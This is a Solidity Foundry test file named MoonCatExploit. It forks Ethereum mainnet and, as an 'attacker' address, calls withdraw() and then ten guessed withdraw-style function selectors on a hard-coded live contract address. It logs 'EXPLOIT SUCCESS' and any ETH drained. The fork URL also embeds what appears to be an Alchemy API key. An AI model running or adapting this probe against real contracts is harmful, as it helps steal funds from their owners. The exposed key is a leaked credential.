// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract MoonCatExploit is Test {
    address constant MOONCAT = 0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
    }

    function test_withdrawExploit() public {
        uint256 contractBal = MOONCAT.balance;
        uint256 attackerBefore = attacker.balance;

        vm.prank(attacker);
        (bool success,) = MOONCAT.call(abi.encodeWithSignature("withdraw()"));

        uint256 attackerAfter = attacker.balance;

        if (attackerAfter > attackerBefore) {
            console.log("!!! EXPLOIT SUCCESS !!!");
            console.log("Drained:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        }
    }

    function test_allWithdrawFunctions() public {
        uint256 contractBal = MOONCAT.balance;
        console.log("Contract balance:", contractBal / 1e18, "ETH");

        bytes4[10] memory funcs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("withdrawBalance()")),
            bytes4(keccak256("claimBalance()")),
            bytes4(keccak256("rescueBalance()")),
            bytes4(keccak256("withdrawEth()")),
            bytes4(keccak256("withdrawETH()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("emergencyWithdraw()"))
        ];

        for (uint i = 0; i < funcs.length; i++) {
            uint256 before = attacker.balance;
            vm.prank(attacker);
            MOONCAT.call(abi.encodeWithSelector(funcs[i]));
            MOONCAT.call(abi.encodeWithSelector(funcs[i], contractBal));
            MOONCAT.call(abi.encodeWithSelector(funcs[i], attacker));

            if (attacker.balance > before) {
                console.log("!!! FOUND at index:", i);
                console.log("Gained:", (attacker.balance - before) / 1e18, "ETH");
            }
        }
    }
}
